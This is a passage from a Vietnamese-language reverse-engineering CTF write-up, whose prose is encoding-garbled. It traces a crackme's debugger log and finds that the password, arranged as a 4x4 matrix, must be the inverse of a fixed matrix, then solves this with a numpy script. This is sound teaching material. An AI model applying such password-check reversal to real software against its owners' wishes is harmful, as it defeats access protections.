=&gt; 0x5555555564af:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x5555555564d1:	add    rax,rdx                  
=&gt; 0x5555555564f2:	mov    QWORD PTR [rbp-0x8],rax       // QWORD PTR [rbp-0x8]=k
=&gt; 0x55555555650e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555652a:	mov    rdx,QWORD PTR [rax+0x10]    // rdx=0x555555574a40   # memory 1
=&gt; 0x555555556546:	mov    rax,QWORD PTR [rbp-0x8]   
=&gt; 0x555555556562:	shl    rax,0x3                        // shl 4*i+j,0x3
=&gt; 0x555555556584:	add    rdx,rax
=&gt; 0x5555555565a5:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x5555555565c7:	mov    QWORD PTR [rdx],rax                    // 0x555555574a40+(shl k,0x3) : pos(input[k])-i*j
=&gt; 0x5555555565ef:	mov    eax,0x1
=&gt; 0x555555556610:	leave
=&gt; 0x55555555661a:	ret
=&gt; 0x55555555c362:	add    DWORD PTR [rbp-0x288],0x1                      cap nhat index moi hang
=&gt; 0x55555555c3a1:	cmp    DWORD PTR [rbp-0x288],0x3
    ‚Üí cmp operands: DWORD PTR [rbp-0x288] = N/A, 0x3 = 3
=&gt; 0x55555555c3d9:	jle    0x55555555bfd8
</code></pre><p>ƒêo·∫°n m√£ n√†y t·∫£i c√°c ƒëo·∫°n 4 k√Ω t·ª± m·ªôt v√† l∆∞u v√†o 1 ƒë·ªãa ch·ªâ, m√¨nh d·ª±ng l·∫°i nh∆∞ sau.</p>
<pre tabindex="0"><code>k=4*i+j
for(i=0;i&lt;4;i++){
    for(j=0;j&lt;4;j++){
    (QWORD *) (0x555555574a40+k&lt;&lt;0x3)=input[k]-0x41-i*j
    }
}
</code></pre><p>Nh∆∞ v·∫≠y ch∆∞∆°ng tr√¨nh t·∫°o m·ªôt ma tr·∫≠n 4x4 g·ªìm c√°c gi√° tr·ªã l√† kho·∫£ng c√°ch t·ª´ v·ªã tr√≠ c·ªßa k√Ω t·ª± ƒë·∫øn &lsquo;A&rsquo; r·ªìi tr·ª´ ƒëi i*j. Ti·∫øp t·ª•c debug ch∆∞∆°ng tr√¨nh ta g·∫∑p ƒëo·∫°n m√£ sau.</p>
<pre tabindex="0"><code>=&gt; 0x55555555c5ff:	call   0x555555556630    /// phep nhan ma tran

=&gt; 0x55555555663c:	endbr64
=&gt; 0x555555556655:	push   rbp
=&gt; 0x555555556671:	mov    rbp,rsp
=&gt; 0x555555556692:	sub    rsp,0x50
=&gt; 0x5555555566ae:	mov    QWORD PTR [rbp-0x38],rdi
=&gt; 0x5555555566ca:	mov    QWORD PTR [rbp-0x40],rsi
=&gt; 0x5555555566e6:	mov    QWORD PTR [rbp-0x48],rdx
=&gt; 0x555555556713:	mov    rax,QWORD PTR fs:0x28
=&gt; 0x555555556745:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x555555556779:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x555555556795:	mov    rdx,QWORD PTR [rax+0x8]
=&gt; 0x5555555567b1:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x5555555567d3:	mov    rax,QWORD PTR [rax]
=&gt; 0x5555555567fa:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555556824:	je     0x555555556891
=&gt; 0x55555555689d:	mov    rax,QWORD PTR [rbp-0x48]
=&gt; 0x5555555568bf:	mov    rdx,QWORD PTR [rax]
=&gt; 0x5555555568e0:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x555555556902:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555556929:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555556953:	jne    0x555555556a31
=&gt; 0x55555555697a:	mov    rax,QWORD PTR [rbp-0x48]
=&gt; 0x555555556996:	mov    rdx,QWORD PTR [rax+0x8]
=&gt; 0x5555555569b2:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x5555555569ce:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x5555555569f0:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555556a1a:	je     0x555555556a87
=&gt; 0x555555556aa3:	mov    DWORD PTR [rbp-0x2c],0x0
=&gt; 0x555555556ad9:	jmp    0x55555555749f
=&gt; 0x5555555574b1:	mov    eax,DWORD PTR [rbp-0x2c]
=&gt; 0x5555555574d8:	movsxd rdx,eax
=&gt; 0x5555555574f9:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x55555555751b:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555557542:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 0, $rax = 4
=&gt; 0x55555555756c:	jb     0x555555556af1
=&gt; 0x555555556b0d:	mov    DWORD PTR [rbp-0x28],0x0
=&gt; 0x555555556b43:	jmp    0x5555555573a6
=&gt; 0x5555555573b8:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x5555555573df:	movsxd rdx,eax
=&gt; 0x555555557400:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x55555555741c:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x55555555743e:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 0, $rax = 4
=&gt; 0x555555557468:	jb     0x555555556b5b
=&gt; 0x555555556b71:	mov    QWORD PTR [rbp-0x10],0x0
=&gt; 0x555555556bab:	mov    DWORD PTR [rbp-0x24],0x0
=&gt; 0x555555556be1:	jmp    0x5555555570bb
=&gt; 0x5555555570cd:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x5555555570f4:	movsxd rdx,eax
=&gt; 0x555555557115:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x555555557137:	mov    rax,QWORD PTR [rax]
=&gt; 0x55555555715e:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 0, $rax = 4
=&gt; 0x555555557188:	jb     0x555555556bf9
=&gt; 0x555555556c0f:	mov    QWORD PTR [rbp-0x20],0x0
=&gt; 0x555555556c43:	mov    QWORD PTR [rbp-0x18],0x0
=&gt; 0x555555556c73:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x555555556c9a:	movsxd rdx,eax
=&gt; 0x555555556cc1:	mov    eax,DWORD PTR [rbp-0x2c]
=&gt; 0x555555556ce8:	movsxd rsi,eax
=&gt; 0x555555556d09:	lea    rcx,[rbp-0x20]
=&gt; 0x555555556d25:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x555555556d47:	mov    rdi,rax

=&gt; 0x555555556d6f:	call   0x555555555ca0

=&gt; 0x555555555cac:	endbr64
=&gt; 0x555555555cc5:	push   rbp
=&gt; 0x555555555ce1:	mov    rbp,rsp
=&gt; 0x555555555d02:	sub    rsp,0x30
=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x555555555df6:	jb     0x555555555e63
=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x555555555ecc:	jb     0x555555555f39
=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
=&gt; 0x555555555fae:	mov    rdx,rax
=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x555555555ff1:	add    rax,rdx
=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556082:	shl    rax,0x3
=&gt; 0x5555555560a4:	add    rax,rdx
=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
=&gt; 0x555555556136:	mov    eax,0x1
=&gt; 0x555555556157:	leave
=&gt; 0x555555556161:	ret

=&gt; 0x555555556db9:	test   al,al
=&gt; 0x555555556ddb:	je     0x555555556e48
=&gt; 0x555555556e5a:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x555555556e81:	movsxd rdx,eax
=&gt; 0x555555556ea8:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x555555556ecf:	movsxd rsi,eax
=&gt; 0x555555556ef0:	lea    rcx,[rbp-0x18]
=&gt; 0x555555556f0c:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x555555556f2e:	mov    rdi,rax
=&gt; 0x555555556f56:	call   0x555555555ca0
=&gt; 0x555555555cac:	endbr64
=&gt; 0x555555555cc5:	push   rbp
=&gt; 0x555555555ce1:	mov    rbp,rsp
=&gt; 0x555555555d02:	sub    rsp,0x30
=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x555555555df6:	jb     0x555555555e63
=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x555555555ecc:	jb     0x555555555f39
=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
=&gt; 0x555555555fae:	mov    rdx,rax
=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x555555555ff1:	add    rax,rdx
=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556082:	shl    rax,0x3
=&gt; 0x5555555560a4:	add    rax,rdx
=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
=&gt; 0x555555556136:	mov    eax,0x1
=&gt; 0x555555556157:	leave
=&gt; 0x555555556161:	ret


=&gt; 0x555555555cac:	endbr64
=&gt; 0x555555555cc5:	push   rbp
=&gt; 0x555555555ce1:	mov    rbp,rsp
=&gt; 0x555555555d02:	sub    rsp,0x30
=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x555555555df6:	jb     0x555555555e63
=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x555555555ecc:	jb     0x555555555f39
=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
=&gt; 0x555555555fae:	mov    rdx,rax
=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x555555555ff1:	add    rax,rdx
=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556082:	shl    rax,0x3
=&gt; 0x5555555560a4:	add    rax,rdx
=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
=&gt; 0x555555556136:	mov    eax,0x1
=&gt; 0x555555556157:	leave
=&gt; 0x555555556161:	ret

=&gt; 0x555555556db9:	test   al,al
=&gt; 0x555555556ddb:	je     0x555555556e48
=&gt; 0x555555556e5a:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x555555556e81:	movsxd rdx,eax
=&gt; 0x555555556ea8:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x555555556ecf:	movsxd rsi,eax
=&gt; 0x555555556ef0:	lea    rcx,[rbp-0x18]
=&gt; 0x555555556f0c:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x555555556f2e:	mov    rdi,rax
=&gt; 0x555555556f56:	call   0x555555555ca0
...........

=&gt; 0x555555556fa0:	test   al,al
=&gt; 0x555555556fc2:	je     0x55555555702f
=&gt; 0x55555555703b:	mov    rdx,QWORD PTR [rbp-0x20]
=&gt; 0x555555557057:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555557073:	imul   rax,rdx
=&gt; 0x55555555708f:	add    QWORD PTR [rbp-0x10],rax
=&gt; 0x5555555570ab:	add    DWORD PTR [rbp-0x24],0x1
=&gt; 0x5555555570cd:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x5555555570f4:	movsxd rdx,eax
=&gt; 0x555555557115:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x555555557137:	mov    rax,QWORD PTR [rax]
=&gt; 0x55555555715e:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555557188:	jb     0x555555556bf9
=&gt; 0x5555555571b5:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x5555555571dc:	movsxd rdx,eax
=&gt; 0x555555557203:	mov    eax,DWORD PTR [rbp-0x2c]
=&gt; 0x55555555722a:	movsxd rsi,eax
=&gt; 0x55555555724b:	mov    rcx,QWORD PTR [rbp-0x10]
=&gt; 0x555555557267:	mov    rax,QWORD PTR [rbp-0x48]
=&gt; 0x555555557289:	mov    rdi,rax
=&gt; 0x5555555572b1:	call   0x555555556180
=&gt; 0x55555555618c:	endbr64
=&gt; 0x5555555561a5:	push   rbp
=&gt; 0x5555555561c1:	mov    rbp,rsp
=&gt; 0x5555555561e2:	sub    rsp,0x30
=&gt; 0x5555555561fe:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x55555555621a:	mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x555555556236:	mov    QWORD PTR [rbp-0x28],rdx
=&gt; 0x555555556252:	mov    QWORD PTR [rbp-0x30],rcx
=&gt; 0x55555555626e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555556290:	mov    rax,QWORD PTR [rax]
=&gt; 0x5555555562b1:	cmp    QWORD PTR [rbp-0x20],rax
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x5555555562d6:	jb     0x555555556343
=&gt; 0x55555555634f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555636b:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555556387:	cmp    QWORD PTR [rbp-0x28],rax
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x5555555563ac:	jb     0x555555556419
=&gt; 0x555555556425:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555556441:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555556464:	imul   rax,QWORD PTR [rbp-0x20]
=&gt; 0x55555555648e:	mov    rdx,rax
=&gt; 0x5555555564af:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x5555555564d1:	add    rax,rdx
=&gt; 0x5555555564f2:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x55555555650e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555652a:	mov    rdx,QWORD PTR [rax+0x10]
=&gt; 0x555555556546:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556562:	shl    rax,0x3
=&gt; 0x555555556584:	add    rdx,rax
=&gt; 0x5555555565a5:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x5555555565c7:	mov    QWORD PTR [rdx],rax
=&gt; 0x5555555565ef:	mov    eax,0x1
=&gt; 0x555555556610:	leave
=&gt; 0x55555555661a:	ret
=&gt; 0x5555555572fb:	test   al,al
=&gt; 0x55555555731d:	je     0x55555555738a
=&gt; 0x555555557396:	add    DWORD PTR [rbp-0x28],0x1
=&gt; 0x5555555573b8:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x5555555573df:	movsxd rdx,eax
=&gt; 0x555555557400:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x55555555741c:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x55555555743e:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555557468:	jb     0x555555556b5b
=&gt; 0x55555555748f:	add    DWORD PTR [rbp-0x2c],0x1
=&gt; 0x5555555574b1:	mov    eax,DWORD PTR [rbp-0x2c]
=&gt; 0x5555555574d8:	movsxd rdx,eax
=&gt; 0x5555555574f9:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x55555555751b:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555557542:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x55555555756c:	jb     0x555555556af1
=&gt; 0x55555555759a:	mov    eax,0x1
=&gt; 0x5555555575be:	mov    rdx,QWORD PTR [rbp-0x8]
.......
</code></pre><p>M√¨nh ƒë·ªçc ƒëo·∫°n m√£ n√†y trong text l·∫°i kh√° l√† d√†i v√† c≈©ng kh√¥ng hi·ªÉu r√µ n√≥ l√†m g√¨. Nh·ªù g·ª£i √Ω c·ªßa m·ªçi ng∆∞·ªùi n√™n m√¨nh th·ª≠ m·ªôt v√†i input ƒë·∫∑c bi·ªát r·ªìi debug, cu·ªëi c√πng m√¨nh ƒëo√°n ƒë∆∞·ª£c ƒë√¢y l√† m·ªôt ƒëo·∫°n m√£ th·ª±c hi·ªán vi·ªác nh√¢n ma tr·∫≠n ƒë∆∞·ª£c t·∫°o t·ª´ input v√† 1 ma tr·∫≠n ƒë∆∞·ª£c ch∆∞∆°ng tr√¨nh t·∫°o s·∫µn.</p>
<pre tabindex="0"><code>=&gt; 0x55555555c890:	mov    eax,DWORD PTR [rbp-0x284]  i  //loop 2
=&gt; 0x55555555c8c0:	cmp    eax,DWORD PTR [rbp-0x280]  // j
    ‚Üí cmp operands: $eax = 0, DWORD PTR [rbp-0x280] = N/A // cmp j,i
=&gt; 0x55555555c8f0:	jne    0x55555555caa5

=&gt; 0x55555555c927:	movzx  edx,BYTE PTR [rbp-0x295]       edx=1(1)
=&gt; 0x55555555c966:	mov    rax,QWORD PTR [rbp-0x278]    
=&gt; 0x55555555c995:	cmp    rax,0x1                            
    ‚Üí cmp operands: $rax = -600, 0x1 = 1              cmp q(0x7fffffffda68),1
=&gt; 0x55555555c9b7:	sete   al          // al=0
=&gt; 0x55555555c9de:	movzx  eax,al
=&gt; 0x55555555c9fe:	and    eax,edx         // eax=0
=&gt; 0x55555555ca16:	test   eax,eax      
=&gt; 0x55555555ca35:	setne  al         // al=1
=&gt; 0x55555555ca5f:	mov    BYTE PTR [rbp-0x295],al ///   BYTE PTR [rbp-0x295] =1
=&gt; 0x55555555ca8d:	jmp    0x55555555cc1f
=&gt; 0x55555555cc3b:	add    DWORD PTR [rbp-0x280],0x1               // counter DWORD PTR [rbp-0x280]
=&gt; 0x55555555cc7a:	cmp    DWORD PTR [rbp-0x280],0x3
    ‚Üí cmp operands: DWORD PTR [rbp-0x280] = N/A, 0x3 = 3
=&gt; 0x55555555ccb2:	jle    0x55555555c6fd


=&gt; 0x55555555c712:	mov    eax,DWORD PTR [rbp-0x280] 
=&gt; 0x55555555c73f:	movsxd rdx,eax                 //rdx=j
=&gt; 0x55555555c769:	mov    eax,DWORD PTR [rbp-0x284]
=&gt; 0x55555555c796:	movsxd rsi,eax            //rsi =i
=&gt; 0x55555555c7c7:	lea    rcx,[rbp-0x278]        // rcx=0
=&gt; 0x55555555c806:	lea    rax,[rbp-0x230]        // rax=4; rbp-0x230=4
=&gt; 0x55555555c83b:	mov    rdi,rax                 //rdi=4
=&gt; 0x55555555c863:	call   0x555555555ca0
=&gt; 0x555555555cac:	endbr64                                                     
=&gt; 0x555555555cc5:	push   rbp
=&gt; 0x555555555ce1:	mov    rbp,rsp
=&gt; 0x555555555d02:	sub    rsp,0x30
=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi //4
=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi // i
=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx // j
=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx //0
=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]   // rax=4
=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax 
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x555555555df6:	jb     0x555555555e63
=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8] // rax=4
=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax /// cmp counter, 4
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x555555555ecc:	jb     0x555555555f39
=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]    //rax=4
=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20] 
=&gt; 0x555555555fae:	mov    rdx,rax                    // rdx=4*i
=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x555555555ff1:	add    rax,rdx                         // rax=4*i+j
=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax   // QWORD PTR [rbp-0x8]=4*i+j= k
=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]  
=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556082:	shl    rax,0x3                     
=&gt; 0x5555555560a4:	add    rax,rdx                  
=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]       
=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30] 
=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx      
=&gt; 0x555555556136:	mov    eax,0x1
=&gt; 0x555555556157:	leave
=&gt; 0x555555556161:	ret
......
</code></pre><p>ƒê·ªçc ti·∫øp trong file log.txt, ch∆∞∆°ng tr√¨nh sau khi nh√¢n ma tr·∫≠n s·∫Ω x·ª≠ l√Ω duy·ªát qua tr·∫≠n tr·∫≠n thu ƒë∆∞·ª£c v√† ki·ªÉm tra xem li·ªáu v·ªõi c√°c gi√° tr·ªã c√≥ index h√†ng b·∫±ng index c·ªôt th√¨ c√≥ b·∫±ng 1 hay kh√¥ng, v·ªõi c√°c gi√° tr·ªã c√≤n l·∫°i c√≥ b·∫±ng 0 hay kh√¥ng. N√≥i c√°ch kh√°c, ch∆∞∆°ng tr√¨nh so s√°nh ma tr·∫≠n thu ƒë∆∞·ª£c sau ph√©p nh√¢n v·ªõi ma tr·∫≠n ƒë∆°n v·ªã. M√¨nh r√∫t g·ªçn l·∫°i logic c·ªßa ƒëo·∫°n n√†y nh∆∞ sau:</p>
<pre tabindex="0"><code>
=&gt; 0x55555555c8f0:	jne    0x55555555caa5
ZF=0   {
=&gt; 0x55555555cac1:	movzx  edx,BYTE PTR [rbp-0x295]
=&gt; 0x55555555cb00:	mov    rax,QWORD PTR [rbp-0x278]
=&gt; 0x55555555cb35:	test   rax,rax
=&gt; 0x55555555cb5c:	sete   al
=&gt; 0x55555555cb83:	movzx  eax,al
=&gt; 0x55555555cba3:	and    eax,edx
=&gt; 0x55555555cbbb:	test   eax,eax
=&gt; 0x55555555cbda:	setne  al
=&gt; 0x55555555cc04:	mov    BYTE PTR [rbp-0x295],al  
										}
}

ZF !=0 {
=&gt; 0x55555555c927:	movzx  edx,BYTE PTR [rbp-0x295]       
=&gt; 0x55555555c966:	mov    rax,QWORD PTR [rbp-0x278]    
=&gt; 0x55555555c995:	cmp    rax,0x1                            
    ‚Üí cmp operands: $rax = -600, 0x1 = 1             
=&gt; 0x55555555c9b7:	sete   al          // al=0
=&gt; 0x55555555c9de:	movzx  eax,al
=&gt; 0x55555555c9fe:	and    eax,edx         // eax=0
=&gt; 0x55555555ca16:	test   eax,eax      
=&gt; 0x55555555ca35:	setne  al         // al=1
=&gt; 0x55555555ca5f:	mov    BYTE PTR [rbp-0x295],al ///   BYTE PTR [rbp-0x295] =1
}
</code></pre><p>ƒê·∫øn l√∫c n√†y, ch√∫ng ta ƒë√£ nh√¨n ra v·∫•n ƒë·ªÅ: Input c·ªßa ch√∫ng ta s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω b·ªè k√Ω t·ª± &lsquo;-&rsquo;, th·ª±c hi·ªán bi·∫øn ƒë·ªïi nh∆∞ tr√™n r·ªìi t·∫£i v√†o ma tr·∫≠n, nh√¢n ma tr·∫≠n v·ªõi m·ªôt ma tr·∫≠n cho s·∫µn r·ªìi so s√°nh v·ªõi ma tr·∫≠n ƒë∆°n v·ªã. Vi·ªác cu·ªëi c√πng m√¨nh c·∫ßn l√†m l√† t√¨m ma tr·∫≠n cho s·∫µn. Debug l·∫°i v√† d·ªÖ d√†ng t√¨m ƒë∆∞·ª£c ma tr·∫≠n ƒë∆∞·ª£c ch∆∞∆°ng tr√¨nh t·∫°o s·∫µn ƒë·ªÉ nh√¢n:</p>
<p></p>
<p>Nh∆∞ v·∫≠y input ph·∫£i th·ªèa m√£n l√† ma tr·∫≠n ngh·ªãch ƒë·∫£o c·ªßa ma tr·∫≠n n√†y. M√¨nh t√¨m ma tr·∫≠n ngh·ªãch ƒë·∫£o, truy ng∆∞·ª£c v·ªÅ password v√† nh·∫≠p l·∫°i th√¨ m√¨nh t√¨m ƒë∆∞·ª£c flag.</p>
<p></p>
<h3 id="3-script">3. Script</h3>
<pre tabindex="0"><code>import numpy as np

A = np.array([
    [88, -17, 19, -57],
    [45, -9, 10, -29],
    [-56, 11, -12, 36],
    [-40, 8, -9, 26]
])


A_inv = np.linalg.inv(A)


res_rows = []
for i, row in enumerate(A_inv):
    row_chars = []
    for j, val in enumerate(row):
        ascii_code = int(round(val + i * j + 0x41))
        row_chars.append(chr(ascii_code))
    res_rows.append(&#39;&#39;.join(row_chars))
res = &#39;-&#39;.join(res_rows)

print(res)
</code></pre><h3 id="4-another-approach">4. Another approach</h3>
